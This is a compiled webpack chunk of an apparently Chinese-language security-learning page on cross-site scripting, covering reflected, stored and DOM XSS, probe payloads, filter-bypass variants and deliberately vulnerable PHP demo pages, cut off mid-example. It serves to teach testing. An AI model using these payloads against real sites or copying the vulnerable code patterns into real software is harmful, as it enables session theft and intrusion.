(window.webpackJsonp=window.webpackJsonp||[]).push([[77],{803:function(s,t,a){"use strict";a.r(t);var r=a(103),n=Object(r.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"xss跨站脚本漏洞"}},[s._v("XSS跨站脚本漏洞 "),a("a",{staticClass:"header-anchor",attrs:{href:"#xss跨站脚本漏洞"}},[s._v("#")])]),s._v(" "),a("p",[s._v("XSS（Cross Site Script，跨站脚本）缩写为CSS，但这会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆。因此，跨站脚本攻击缩写为XSS。")]),s._v(" "),a("h2",{attrs:{id:"本质"}},[s._v("本质 "),a("a",{staticClass:"header-anchor",attrs:{href:"#本质"}},[s._v("#")])]),s._v(" "),a("p",[s._v("客户端代码注入漏洞，通常注入代码是js脚本")]),s._v(" "),a("h2",{attrs:{id:"危害"}},[s._v("危害 "),a("a",{staticClass:"header-anchor",attrs:{href:"#危害"}},[s._v("#")])]),s._v(" "),a("ol",[a("li",[s._v("盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号")]),s._v(" "),a("li",[s._v("控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力")]),s._v(" "),a("li",[s._v("盗窃企业重要的具有商业价值的资料")]),s._v(" "),a("li",[s._v("非法转账")]),s._v(" "),a("li",[s._v("强制发送电子邮件")]),s._v(" "),a("li",[s._v("网站挂马")]),s._v(" "),a("li",[s._v("控制受害者机器向其它网站发起攻击")])]),s._v(" "),a("h2",{attrs:{id:"xss跨站原理"}},[s._v("XSS跨站原理 "),a("a",{staticClass:"header-anchor",attrs:{href:"#xss跨站原理"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("当应用程序发送给浏览器的页面中包含用户提交的数据，但没有经过适当验证或转义时，就会导致跨站脚本漏洞")]),s._v(" "),a("p",[s._v("这个“跨”实际上属于浏览器的特性，而不是缺陷;")]),s._v(" "),a("p",[s._v("浏览器同源策略：只有发布Cookie的网站才能读取Cookie。")]),s._v(" "),a("p",[s._v("会造成Cookie窃取、劫持用户Web行为、结合CSRF进行针对性攻击等危害")])]),s._v(" "),a("h2",{attrs:{id:"分类"}},[s._v("分类 "),a("a",{staticClass:"header-anchor",attrs:{href:"#分类"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"反射型-非持久型"}},[s._v("反射型 （非持久型） "),a("a",{staticClass:"header-anchor",attrs:{href:"#反射型-非持久型"}},[s._v("#")])]),s._v(" "),a("p",[s._v("非持久型XSS攻击是一次性的，仅对单次的页面访问产生影响。非持久型XSS攻击要求用户访问一个被攻击者篡改后的链接来诱使客户点击，比如这样的一段链接："),a("code",[s._v("www.wgpsec.org/?params=<script>alert(/xss/)<\/script>")]),s._v("，用户访问该链接时，被植入的攻击脚本被用户浏览器执行，从而达到攻击的目的。")]),s._v(" "),a("p",[a("strong",[s._v("攻击步骤")])]),s._v(" "),a("ol",[a("li",[s._v("攻击者构造出特殊的 URL，其中包含恶意代码。")]),s._v(" "),a("li",[s._v("用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。")]),s._v(" "),a("li",[s._v("用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。")]),s._v(" "),a("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),a("p",[s._v("该类型XSS常见于搜索、存在传参输出的地方。")]),s._v(" "),a("h3",{attrs:{id:"存储型-xss"}},[s._v("存储型 XSS "),a("a",{staticClass:"header-anchor",attrs:{href:"#存储型-xss"}},[s._v("#")])]),s._v(" "),a("p",[s._v("这种类型的XSS，危害比前一种大得多。比如一个攻击者在用户名中包含了一段JavaScript代码，并且服务器没有正确进行过滤输出，那就会造成浏览这个页面的用户执行这段JavaScript代码。")]),s._v(" "),a("p",[s._v("这种攻击常见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。")]),s._v(" "),a("p",[a("strong",[s._v("攻击步骤")])]),s._v(" "),a("ol",[a("li",[s._v("攻击者将将恶意代码提交到目标网站的数据库中。")]),s._v(" "),a("li",[s._v("用户打开目标网站时，网站服务端将恶意代码从数据库取出，拼接在 HTML 中返回给浏览器。")]),s._v(" "),a("li",[s._v("用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。")]),s._v(" "),a("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),a("p",[a("strong",[s._v("反射型 XSS 跟存储型 XSS 的区别")])]),s._v(" "),a("p",[s._v("存储型 XSS 的恶意代码存在数据库里，反射型 XSS 的恶意代码存在 URL 里。")]),s._v(" "),a("p",[s._v("反射型 XSS 漏洞常见于通过 URL 传递参数的功能，如网站搜索、跳转等。由于需要用户主动打开恶意的 URL 才能生效，攻击者往往会结合多种手段诱导用户点击。")]),s._v(" "),a("p",[s._v("POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。")]),s._v(" "),a("h4",{attrs:{id:"dom型"}},[s._v("DOM型 "),a("a",{staticClass:"header-anchor",attrs:{href:"#dom型"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("基于文档对象模型(Document Object Model)的一种漏洞；")]),s._v(" "),a("p",[s._v("DOM型与反射型类似，都需要攻击者诱使用户点击专门设计的URL；")]),s._v(" "),a("p",[s._v("Dom型xss是通过url传入参数去控制触发的；")]),s._v(" "),a("p",[s._v("Dom型返回页面源码中看不到输入的payload， 而是保存在浏览器的DOM中。")])]),s._v(" "),a("p",[s._v("这种类型则是利用非法输入来闭合对应的html标签。")]),s._v(" "),a("p",[s._v("比如，有这样的一个a标签："),a("code",[s._v("<a href='$var'></a>")]),s._v("\n乍看问题不大，可是当"),a("code",[s._v("$var的内容变为 'οnclick='alert(/xss/) //")]),s._v("，这段代码就会被执行。")]),s._v(" "),a("p",[a("strong",[s._v("假设应用程序返回的页面包含以下脚本：")])]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" url "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("location"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    url "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unescape")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" message "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("substring")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("indexOf")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'message='")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("url"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("write")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("message"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("把javascript代码作为message的参数，这段代码将会被动态的写入到页面中，")]),s._v(" "),a("p",[s._v("并像服务器返回代码一样得以执行。")]),s._v(" "),a("p",[a("strong",[s._v("攻击步骤")])]),s._v(" "),a("ol",[a("li",[s._v("攻击者构造出特殊的 URL，其中包含恶意代码。")]),s._v(" "),a("li",[s._v("用户打开带有恶意代码的 URL。")]),s._v(" "),a("li",[s._v("用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。")]),s._v(" "),a("li",[s._v("恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。")])]),s._v(" "),a("p",[a("strong",[s._v("DOM型XSS 跟前两种 XSS 的区别")])]),s._v(" "),a("p",[s._v("DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。")]),s._v(" "),a("p",[a("strong",[s._v("DOM型XSS 和 反射型 XSS 的区别")])]),s._v(" "),a("p",[s._v("反射型XSS提交的数据会经过服务器，而DOM型XSS不会，这个的意思呢就是不论你后面加多少WAF都是无济于事的。")]),s._v(" "),a("p",[s._v("推荐阅读： "),a("a",{attrs:{href:"https://xz.aliyun.com/t/3919",target:"_blank",rel:"noopener noreferrer"}},[s._v("记一次从DOM型XSS到RCE过程"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"查找利用xss漏洞"}},[s._v("查找利用XSS漏洞 "),a("a",{staticClass:"header-anchor",attrs:{href:"#查找利用xss漏洞"}},[s._v("#")])]),s._v(" "),a("h2",{attrs:{id:"基本验证"}},[s._v("基本验证 "),a("a",{staticClass:"header-anchor",attrs:{href:"#基本验证"}},[s._v("#")])]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v('"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("把这个字符串提交给每个应用程序页面的每个参数；")]),s._v(" "),a("p",[s._v("同时监控它的响应，如果攻击字符串原样出现在响应中，就可能存在XSS漏洞。")]),s._v(" "),a("p",[s._v("许多应用可能会经过黑名单等简单的初步过滤，试图阻止XSS攻击；")]),s._v(" "),a("p",[s._v("可以通过编码等方式绕过：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v('"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("ScRiPt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("ScRiPt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v('\n"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("e"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("cscript"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ealert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v("c"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3")]),s._v('e\n"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("scr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("ipt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("scr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("ipt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("00")]),s._v('"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("document"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("cookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("当利用基于DOM的XSS漏洞时，攻击有效载荷并不在服务器的响应中返回，而是保存在浏览器的DOM中，并可被客户端javascript访问。")]),s._v(" "),a("p",[s._v("在这种情况下，以上基本验证无法发现XSS漏洞。")]),s._v(" "),a("p",[s._v("简单来说，主要是以下过程。")]),s._v(" "),a("h3",{attrs:{id:"寻找可控点"}},[s._v("寻找可控点 "),a("a",{staticClass:"header-anchor",attrs:{href:"#寻找可控点"}},[s._v("#")])]),s._v(" "),a("ol",[a("li",[s._v("找到可控点，比如一段搜索参数，在提交或输入参数后翻阅源代码 我们输入的源数据是否被原样输出")]),s._v(" "),a("li",[s._v("看可控点是否可以闭合标签，尝试单引号双引号方式输入特殊字符尝试是否过滤")]),s._v(" "),a("li",[s._v("尝试输入一些会让程序报错的语句 比如单个 "),a("code",[s._v("'")]),s._v(" "),a("code",[s._v('"')]),s._v(" "),a("code",[s._v("<")]),s._v(" "),a("code",[s._v(">")]),s._v(" 等")]),s._v(" "),a("li",[s._v("阅读代码找到可控点")]),s._v(" "),a("li",[s._v("找到可控点且可利用，但是有过滤，可尝试各种绕过方式去触发")])]),s._v(" "),a("h2",{attrs:{id:"查找反射型xss"}},[s._v("查找反射型XSS "),a("a",{staticClass:"header-anchor",attrs:{href:"#查找反射型xss"}},[s._v("#")])]),s._v(" "),a("h4",{attrs:{id:"测试引入脚本的反射"}},[s._v("测试引入脚本的反射 "),a("a",{staticClass:"header-anchor",attrs:{href:"#测试引入脚本的反射"}},[s._v("#")])]),s._v(" "),a("p",[a("strong",[s._v("例1")]),s._v("，标签属性值：")]),s._v(" "),a("p",[s._v("假设返回页面中包含以下脚本：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("input type"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"text"')]),s._v(" name"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"name"')]),s._v(" value"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test-text"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("很明显，利用xss的方法是终止包含字符串的双引号，结束``标签")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v('"'),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("例2")]),s._v("，javascript字符串：")]),s._v(" "),a("p",[s._v("假设返回页面中包含以下脚本：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'test-text'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("var")]),s._v(" b"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("123")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("...")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("script"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("用分号终止语句")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'; alert(1); var foo='")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("例3")]),s._v("，包含URL的特性")]),s._v(" "),a("p",[s._v("假设返回页面中包含以下脚本：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),s._v("a href"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"test-text"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("Click here"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("a"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("html\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("这时，受控制的字符插入到一个``标签的"),a("code",[s._v("href")]),s._v("属性中。")]),s._v(" "),a("p",[s._v("这个属性可能包含一个使用"),a("code",[s._v("javascript:")]),s._v("协议的URL，利用：")]),s._v(" "),a("div",{staticClass:"language-javascript line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-javascript"}},[a("code",[s._v("javascript"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("alert")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("strong",[s._v("例4")]),s._v("，输出点存在JS内且转义")]),s._v(" "),a("div",{staticClass:"language-php+HTML line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<!DOCTYPE html>\n<html>\n<head>\n\t<title>XSS转义</title>\n</head>\n<body>\n\tXSS\n<?php\n/**\n * Created by PhpStorm.\n * User: keac wu\n * Date: 2019/12/26 0012\n * Time: 15:53\n */\n\n $input= $_GET["xss"];\n echo htmlspecialchars("$input");\n ?>\n<script type="text/javascript">\n\tvar a=\'<?php echo htmlspecialchars("$input") ?>\';\n\tconsole.log(a)\n<\/script>\n\n</body>\n</html>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br")])]),a("p",[s._v("这种情况下，当我们直接输入 "),a("code",[s._v("<script><\/script>")]),s._v(" 什么的HTML标签的时候会被直接转义")]),s._v(" "),a("blockquote",[a("p",[s._v("htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。")]),s._v(" "),a("p",[s._v("预定义的字符是：")]),s._v(" "),a("ul",[a("li",[s._v("& （和号）成为 &")]),s._v(" "),a("li",[s._v('" （双引号）成为 "')]),s._v(" "),a("li",[s._v("' （单引号）成为 '")]),s._v(" "),a("li",[s._v("< （小于）成为 <")]),s._v(" "),a("li",[s._v("> （大于）成为 >")])])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/8.png",alt:"sdf"}})]),s._v(" "),a("p",[s._v("这种时候我们就要尝试，看看单引号 双引号会不会被过滤，最后看到是单引号不会被过滤，而且只有单个单引号的时候会报错。")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/9.png",alt:"sdf"}})]),s._v(" "),a("p",[s._v("这种时候就可以利用了")]),s._v(" "),a("p",[a("code",[s._v("';alert(1)//")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/10.png",alt:"sdf"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://www.loongten.com/2019/12/23/pentest-learn-xss/11.png",alt:"sdf"}})]),s._v(" "),a("p",[a("strong",[s._v("例5")]),s._v("，输出点存在JS内怎么触发")]),s._v(" "),a("div",{staticClass:"language-php+HTML line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v('<!DOCTYPE html>\n<html>\n<head>\n\t<title></title>\n</head>\n<body>\n\tXSS 在函数情况情况下。。。<br>\n<?php\n/**\n * Created by PhpStorm.\n * User: keac wu\n * Date: 2019/12/26 0012\n * Time: 15:53\n */\n\n $input= $_GET["xss"];\n echo htmlspecialchars("$input");\n\n ?>\n  <input type="text" id="myInput" onclick="myFunction()">\n<script type="text/javascript">\n\nfunction myFunction() {\n    var a= \'<?php  echo htmlspecialchars("$input") ?>\';\n}\n\n<\/script>\n\n</body>\n</html>\n')])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("1